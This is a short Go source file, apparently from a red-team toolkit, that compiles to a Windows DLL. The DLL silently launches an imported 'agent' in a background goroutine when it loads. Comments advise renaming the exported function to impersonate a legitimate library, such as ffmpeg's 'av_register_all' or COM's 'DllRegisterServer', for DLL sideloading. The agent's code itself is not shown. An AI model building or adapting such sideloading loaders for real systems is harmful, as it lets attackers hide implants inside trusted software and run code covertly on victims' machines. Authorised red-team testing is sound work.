//go:build windows

// Package main is the DLL entry point for -buildmode=c-shared.
// The agent starts in the background when the DLL is loaded (init).
// Export names can be adjusted to match the target sideload binary.
package main

import "C"

import "redteam/agents/agent-go"

// Export a neutral function name — rename to match the sideload target
// (e.g., "av_register_all" for ffmpeg, "DllRegisterServer" for COM).
//
//export StartAgent
func StartAgent() {}

func main() {}

func init() {
	go agent.Main()
}
